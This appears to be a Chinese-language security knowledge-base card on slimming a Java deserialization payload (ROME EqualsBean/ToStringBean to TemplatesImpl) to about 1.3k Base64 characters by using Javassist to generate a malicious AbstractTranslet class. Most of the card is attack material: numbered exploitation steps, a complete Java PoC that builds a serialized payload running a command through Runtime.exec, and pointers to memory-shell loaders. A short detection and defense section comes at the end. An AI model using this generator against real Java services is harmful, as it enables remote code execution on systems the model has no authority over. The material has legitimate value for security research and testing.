---
id: web-java-deserialization-templatesimpl-rome-javassist-payload-slimming
title: TemplatesImpl/ROME 链 payload 瘦身：Javassist 免编译生成 AbstractTranslet 字节码，省 _tfactory、_name 与容器 value 缩到 1 字符，Base64 从 2.8k 压到 1.3k
type: scenario
domain: web
path: web/java/deserialization
technique: templatesimpl-javassist-minimal-payload-slimming
aliases:
- ROME payload 缩短
- EqualsBean 1.3k
- Javassist 生成恶意类
- 免编译 AbstractTranslet
- 反序列化 payload 长度限制
- TemplatesImpl 最小 payload
tags:
- java
- deserialization
- templatesimpl
- rome
- javassist
- payload-length
- gadget
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V690
  verified_at: '2026-11-13T16:36:07+08:00'
  notes: 已对照原文与6张截图核对；图01 Templates 接口仅 newTransformer/getOutputProperties、图02 EqualsBean(_beanClass/_obj, isInstance 检查)、图03 ObjectBean.hashCode→_equalsBean.beanHashCode、图04 Hashtable.readObject→reconstitutionPut、图05 reconstitutionPut 中 key.hashCode、图06 缩短版 EqualsBean 链 Base64 长度 1312 且弹出计算器，均与卡内一致；_name=1字符、HashMap value=1字符、省略 _tfactory(JDK8 readObject 重建)与原文缩短 EXP 一致；文章 pom 的 rome 1.0 为依赖版本非受影响区间，未设 affected_versions；未复跑PoC
---

## 一句话结论

当反序列化入口对 payload 长度有限制（请求行/头长度、WAF、应用层上限）时，可以对 TemplatesImpl 系链做构造级瘦身：用 Javassist 的 `ClassPool/CtClass` 直接生成继承 `AbstractTranslet` 的恶意类字节码（构造器里 `Runtime.getRuntime().exec(cmd)`，不需要 javac 编译、也不必重写 `transform()` 方法），构造 `TemplatesImpl` 时省略 `_tfactory`（JDK8 的 `readObject` 会重建）、`_name` 只取 1 个字符，并把 HashMap 的 value 缩短为 1 个字符，ROME `EqualsBean→ToStringBean→TemplatesImpl` 链的 Base64 长度可从约 2.8k 降到约 1.3k（示例 1312 字符）。

## 原理

- **TemplatesImpl 的执行条件**：`getOutputProperties()` → `newTransformer()` → `getTransletInstance()` 要求 `_name != null`、`_class == null`、`_bytecodes` 为二维字节数组；`defineTransletClasses()` 用 `TransletClassLoader` define 每个字节码类，取第一个类实例化，构造函数/静态块即执行。执行路径只负责“实例化 translet”，并不会调用 `transform()`，所以恶意类即使没有重写两个抽象 `transform` 方法也不会在利用时抛 `AbstractMethodError`。
- **为什么用 Javassist 生成而不是 javac**：手写 `.java` 继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet` 时，编译器强制实现抽象方法，而且需要针对目标 JDK 的内部类编译；Javassist 的 `ClassPool` 按类名解析父类后用 `CtNewConstructor.make` 写方法体，`CtClass.toBytecode()` 直接产出一个“默认非抽象但未实现抽象方法”的类文件，绕过编译期约束，字节码体积也更小。
- **_tfactory 可以省略**：`TemplatesImpl._tfactory` 是 `transient`，JDK8 的 `TemplatesImpl.readObject` 会重新创建 `TransformerFactoryImpl`；`defineTransletClasses()` 里对 `_tfactory.getExternalExtensionsMap()` 的调用因此不会 NPE。其他 JDK 版本若不重建，需要显式赋值——这是跨版本边界。
- **字段最短化**：`_name` 只要求非 null，取 `"a"`；`_bytecodes` 只放一个类；`_class` 保持 null；序列化图里的 HashMap value 只参与反序列化容器重建，不参与 hashCode 逻辑，取 `"1"` 即可。以上把 EqualsBean 链从“通用写法”的约 2.8k Base64 压到 1312 字符（约减半）。
- **构造期触发陷阱**：`EqualsBean.hashCode()` → `beanHashCode()` → `_obj.toString()`，而 `ToStringBean.toString()` 会反射调用 `_obj` 的 getter。若在 `hashMap.put(equalsBean, ...)` 之前就把 `ToStringBean._obj` 设为 `TemplatesImpl`，put 时就会触发 `getOutputProperties()`（生成端也可能弹计算器）。正确做法是先用无害占位（如 `new ConstantTransformer(1)`）构造并 put，再反射把 `_obj` 改回 `TemplatesImpl` 后序列化；文章前几条 EXP 用了该手法，缩短版 EXP 省略了占位步骤，因此可能在 put 阶段就执行。
- **为什么链本身可瘦**：EqualsBean/ObjectBean 都是 ROME 的小对象；TemplatesImpl 的字段中 `_name`、`_tfactory`、`_class` 在反序列化后由目标端重建或保持 null；真正的体积来自 `_bytecodes` 与容器类名，Javassist 生成的类只有构造器和少量常量池条目。
- **边界**：需要 classpath 有 rome（或等价 ToStringBean 触发点）与 TemplatesImpl 可达；目标 JDK 需允许反射写 `_name/_bytecodes`（JDK8 或未强封装模块）；长度上限低于约 1.3k 时需改用两段式 defineClass 把内存马字节码走请求参数。

## 触发条件

- 存在可利用的反序列化入口与 TemplatesImpl 系链（ROME `EqualsBean`/`ObjectBean`、CC 系等），且 rome/TemplatesImpl 未被过滤器拦截。
- 序列化数据有长度限制（HTTP header 8K、请求行、WAF、业务字段上限等），需要压缩到约 1.3k 以内。
- 攻击者能在本地运行 payload 生成器（ClassPool 能解析到目标 JDK 的 AbstractTranslet；跨版本需注意类名/字段差异）。
- 目标 JDK 的 `TemplatesImpl.readObject` 会重建 `_tfactory`（JDK8 实测），否则需显式设置。

## 利用步骤

1. 用 Javassist 生成恶意类：`ClassPool.getDefault()` → `makeClass("a")` → `setSuperclass(pool.get(AbstractTranslet.class.getName()))` → `CtNewConstructor.make("public a(){Runtime.getRuntime().exec(\"cmd\");}", clazz)` → `toBytecode()`（或 `writeFile` 落盘）。
2. 反射构造 `TemplatesImpl`：`_name="a"`、`_bytecodes=[[bytes]]`；`_class` 保持 null；不设 `_tfactory`（JDK8 目标）。
3. 构造 `ToStringBean(Templates.class, templates)` 与 `EqualsBean(ToStringBean.class, toStringBean)`；若要求生成端不触发，先把 `toStringBean._obj` 置为 `new ConstantTransformer(1)`。
4. `HashMap.put(equalsBean, "1")` 后，反射把 `toStringBean._obj` 改回 `templates`，序列化并 Base64 编码。
5. 打印 Base64 长度核对（示例 1312）；发送到目标反序列化入口，观察命令执行。
6. 若目标 JDK 不重建 `_tfactory`，补 `new TransformerFactoryImpl()`；若长度仍超限，改用两段式 defineClass 把内存马字节码放到请求参数。

## PoC

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.*;
import org.apache.commons.collections4.functors.ConstantTransformer;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class SlimRome {
    static void set(Object o, String name, Object v) throws Exception {
        Field f = o.getClass().getDeclaredField(name);
        f.setAccessible(true);
        f.set(o, v);
    }

    static byte[] genPayload(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.makeClass("a");
        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        CtConstructor ctor = new CtConstructor(new CtClass[]{}, clazz);
        ctor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(ctor);
        return clazz.toBytecode();
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl t = new TemplatesImpl();
        set(t, "_name", "a");                      // 非 null 即可，取 1 字符
        set(t, "_bytecodes", new byte[][]{genPayload("calc")});
        // 不设 _tfactory：JDK8 TemplatesImpl.readObject 会重建

        ToStringBean tsb = new ToStringBean(Templates.class, new ConstantTransformer(1)); // 占位防触发
        EqualsBean eb = new EqualsBean(ToStringBean.class, tsb);

        HashMap<Object, Object> map = new HashMap<>();
        map.put(eb, "1");                          // value 取 1 字符
        set(tsb, "_obj", t);                       // 改回 TemplatesImpl 再序列化

        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        new ObjectOutputStream(bo).writeObject(map);
        String b64 = Base64.getEncoder().encodeToString(bo.toByteArray());
        System.out.println(b64.length());          // 示例约 1312
    }
}
```

说明：`ConstantTransformer` 来自 commons-collections，仅作为无害占位；没有该依赖时可用任意简单可序列化对象作为 `_obj` 临时值。文章缩短版 EXP 省略占位，put 时会立即触发 TemplatesImpl。

## 变体与关联

- **入口换 ObjectBean/Hashtable**：`ObjectBean.hashCode → EqualsBean.beanHashCode → ToStringBean.toString`，或 `Hashtable.reconstitutionPut → key.hashCode()`，瘦身后的 TemplatesImpl 部分可原样复用；见 [[web-java-deser-rome-equalsbean-tostringbean-templatesimpl]]、[[web-java-deser-rome-badattribute-tostringbean-templatesimpl]]、[[web-java-deser-rome-objectbean-jdbcrowset-jndi]]、[[web-java-deser-rome-spring-hotswappable-xstring-tostringbean-templatesimpl]]。
- **长度更严时**：用 TemplatesImpl 轻量 stub 在 static 块/构造器里从 request 参数取 base64 字节码 `defineClass` 二次加载，payload 主体走参数，见 [[web-java-deserialization-templatesimpl-stub-param-defineclass-secondload]]。
- **非 AbstractTranslet 载荷**：把代码放进构造器/静态块，利用 ClassCastException 之前的副作用，见 [[web-java-deserialization-templatesimpl-non-abstracttranslet-side-effect]]。
- **Javassist 的其它用途**：生成内存马/Filter/Agent 字节码，见 [[web-java-classloader-behinder-bytecode-payload-assembly]]、[[web-java-classloader-deserialization-memshell-loader-selection]]。
- **跨版本**：JDK17 强封装下需 `--add-opens` 或换外部 Xalan TemplatesImpl（[[web-java-deserialization-external-xalan-templatesimpl-sink]]）；`_tfactory` 不被重建时显式赋值。

## 检测与防御

- **检测**：序列化流中出现 `com.sun.syndication.feed.impl.*`、`TemplatesImpl`、`AbstractTranslet` 子类名；反序列化流量长度虽小但含完整 gadget 类名组合；目标 JVM 出现 `TransletClassLoader.defineClass`/`newTransformer` 调用与随即的进程创建。
- **防御**：JEP 290 `ObjectInputFilter` 白名单拒绝 ROME/TemplatesImpl/AbstractTranslet；升级到 JDK17+ 并对内部 Xalan 做模块强封装；移除不必要的 rome/commons-collections 依赖；不要仅依赖长度限制做防护（瘦身链可压到约 1.3k）。
- **根因**：`ToStringBean` 的反射 getter 加上 `TemplatesImpl` 的字节码加载让“构造一个对象图”即可执行代码；长度限制只能提高门槛，不能替代类白名单。
